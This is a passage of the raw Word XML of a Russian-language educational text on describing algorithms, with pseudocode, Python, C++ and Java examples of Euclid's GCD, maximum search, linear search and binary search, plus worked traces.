        <w:t>Операции: `=` (присваивание), `+`, `-`, `*`, `/`, `mod` (остаток от деления)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Алгоритм Евклида (НОД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм НОД(a, b):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Пока b ≠ 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r = a mod b</w:t>
        <w:br/>
        <w:t xml:space="preserve">        a = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">        b = r</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Поиск максимума в массиве</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм НайтиМаксимум(массив A, размер n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    max = A[0]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Для i от 1 до n-1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Если A[i] &gt; max, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            max = A[i]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть max</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Бинарный поиск</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм БинарныйПоиск(массив A, размер n, искомое значение x):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    left = 0</w:t>
        <w:br/>
        <w:t xml:space="preserve">    right = n - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Пока left ≤ right:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        mid = (left + right) / 2  // целочисленное деление</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Если A[mid] = x, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            Вернуть mid  // нашли, вернуть индекс</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Иначе если A[mid] &lt; x, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            left = mid + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Иначе:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            right = mid - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть -1  // не найдено</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компактность (короче словесного описания)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понятность (не нужно знать синтаксис конкретного языка)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко переводится в код</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не выполняется на компьютере (нужно переводить в реальный код)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На экзаменах, в учебниках, при обсуждении алгоритмов с коллегами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Программный код (на языке программирования)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Записываешь алгоритм на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>конкретном языке программирования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Python, C++, Java).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точность (компьютер выполнит код без "интерпретации")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно запустить и протестировать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нужно знать синтаксис языка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Код одного языка не понятен тем, кто знает только другой язык</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Алгоритм Евклида на Python</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def gcd(a, b):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    while b != 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r = a % b</w:t>
        <w:br/>
        <w:t xml:space="preserve">        a = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">        b = r</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return a</w:t>
        <w:br/>
        <w:br/>
        <w:t># Пример использования</w:t>
        <w:br/>
        <w:t>print(gcd(48, 18))  # Вывод: 6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Поиск максимума в массиве на C++</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;iostream&gt;</w:t>
        <w:br/>
        <w:t>using namespace std;</w:t>
        <w:br/>
        <w:br/>
        <w:t>int findMax(int arr[], int n) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int max = arr[0];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for (int i = 1; i &lt; n; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (arr[i] &gt; max) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            max = arr[i];</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return max;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int arr[] = {3, 7, 2, 9, 5};</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cout &lt;&lt; "Max: " &lt;&lt; findMax(arr, 5) &lt;&lt; endl;  // Вывод: Max: 9</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Бинарный поиск на Java</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>public class BinarySearch {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public static int binarySearch(int[] arr, int x) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        int left = 0, right = arr.length - 1;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        while (left &lt;= right) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            int mid = (left + right) / 2;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            if (arr[mid] == x)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                return mid;  // нашли</w:t>
        <w:br/>
        <w:t xml:space="preserve">            else if (arr[mid] &lt; x)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                left = mid + 1;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            else</w:t>
        <w:br/>
        <w:t xml:space="preserve">                right = mid - 1;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return -1;  // не найдено</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    public static void main(String[] args) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        int[] arr = {1, 3, 5, 7, 9, 11};</w:t>
        <w:br/>
        <w:t xml:space="preserve">        System.out.println(binarySearch(arr, 7));  // Вывод: 3</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реализовать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> алгоритм и запустить на компьютере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение способов описания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Способ          | Понятность | Точность | Выполнимость | Применение                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --------------- | ---------- | -------- | ------------ | ------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Словесный       | ✅ Высокая | ⚠️ Низкая | ❌ Нет       | Обучение, документация    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Блок-схема      | ✅ Высокая | ⚠️ Средняя | ❌ Нет      | Проектирование, визуализация |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Псевдокод       | ✅ Высокая | ✅ Высокая | ❌ Нет      | Экзамены, учебники        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Программный код | ⚠️ Средняя | ✅ Высокая | ✅ Да       | Реализация, разработка    |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.5. Примеры алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Разберём несколько классических алгоритмов с описанием в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разных форматах</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Алгоритм Евклида (НОД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти наибольший общий делитель (НОД) двух чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесное описание:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять два числа a и b</w:t>
        <w:br/>
        <w:t>2. Пока b не равно 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Вычислить остаток от деления a на b, сохранить в r</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Присвоить a = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Присвоить b = r</w:t>
        <w:br/>
        <w:t>3. Вернуть a (это НОД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блок-схема:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">        ⬭ Начало</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ▱ Ввести a, b</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ◇ b = 0?</w:t>
        <w:br/>
        <w:t xml:space="preserve">      /       \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Нет        Да</w:t>
        <w:br/>
        <w:t xml:space="preserve">    /           \</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓             ↓</w:t>
        <w:br/>
        <w:t>▭ r = a mod b  ▱ Вывести a</w:t>
        <w:br/>
        <w:t>▭ a = b           |</w:t>
        <w:br/>
        <w:t>▭ b = r           ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">   |            ⬭ Конец</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>(вернуться к проверке b = 0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм НОД(a, b):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Пока b ≠ 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r = a mod b</w:t>
        <w:br/>
        <w:t xml:space="preserve">        a = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">        b = r</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def gcd(a, b):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    while b != 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        a, b = b, a % b</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример выполнения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Найдём НОД(48, 18):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: a = 48, b = 18</w:t>
        <w:br/>
        <w:t xml:space="preserve">       r = 48 mod 18 = 12</w:t>
        <w:br/>
        <w:t xml:space="preserve">       a = 18, b = 12</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 2: a = 18, b = 12</w:t>
        <w:br/>
        <w:t xml:space="preserve">       r = 18 mod 12 = 6</w:t>
        <w:br/>
        <w:t xml:space="preserve">       a = 12, b = 6</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 3: a = 12, b = 6</w:t>
        <w:br/>
        <w:t xml:space="preserve">       r = 12 mod 6 = 0</w:t>
        <w:br/>
        <w:t xml:space="preserve">       a = 6, b = 0</w:t>
        <w:br/>
        <w:br/>
        <w:t>b = 0 → НОД = 6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> НОД(48, 18) = 6.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Линейный поиск</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти элемент `x` в массиве. Вернуть его индекс или -1, если не найден.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесное описание:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять массив A размером n и искомое значение x</w:t>
        <w:br/>
        <w:t>2. Для каждого индекса i от 0 до n-1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Если A[i] = x, вернуть i (нашли)</w:t>
        <w:br/>
        <w:t>3. Если цикл завершился, вернуть -1 (не найдено)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм ЛинейныйПоиск(A, n, x):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Для i от 0 до n-1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Если A[i] = x, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            Вернуть i</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть -1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (C++):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int linearSearch(int arr[], int n, int x) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for (int i = 0; i &lt; n; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (arr[i] == x)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return i;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return -1;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример выполнения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Массив: `[5, 2, 9, 1, 5, 6]`, ищем `x = 9`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 0: A[0] = 5 ≠ 9</w:t>
        <w:br/>
        <w:t>i = 1: A[1] = 2 ≠ 9</w:t>
        <w:br/>
        <w:t>i = 2: A[2] = 9 = 9 → вернуть 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Индекс 2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(n) — в худшем случае проверяем все элементы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Бинарный поиск</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти элемент `x` в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отсортированном</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> массиве. Вернуть индекс или -1.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Делим массив пополам. Если средний элемент равен искомому — нашли. Если меньше — ищем в правой половине, если больше — в левой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесное описание:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять отсортированный массив A, размер n, искомое значение x</w:t>
        <w:br/>
        <w:t>2. Установить left = 0, right = n-1</w:t>
        <w:br/>
        <w:t>3. Пока left ≤ right:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   3.1. Вычислить mid = (left + right) / 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">   3.2. Если A[mid] = x, вернуть mid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   3.3. Если A[mid] &lt; x, установить left = mid + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">   3.4. Иначе установить right = mid - 1</w:t>
        <w:br/>
        <w:t>4. Вернуть -1 (не найдено)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм БинарныйПоиск(A, n, x):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    left = 0</w:t>
        <w:br/>
        <w:t xml:space="preserve">    right = n - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Пока left ≤ right:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        mid = (left + right) / 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Если A[mid] = x, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            Вернуть mid</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Иначе если A[mid] &lt; x, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            left = mid + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Иначе:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            right = mid - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть -1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def binary_search(arr, x):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    left, right = 0, len(arr) - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    while left &lt;= right:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        mid = (left + right) // 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if arr[mid] == x:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return mid</w:t>
        <w:br/>
        <w:t xml:space="preserve">        elif arr[mid] &lt; x:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            left = mid + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">        else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            right = mid - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return -1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример выполнения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Массив: `[1, 3, 5, 7, 9, 11, 13]`, ищем `x = 7`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: left = 0, right = 6, mid = 3</w:t>
        <w:br/>
        <w:t xml:space="preserve">       A[3] = 7 = x → вернуть 3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Индекс 3.</w:t>
      </w:r>
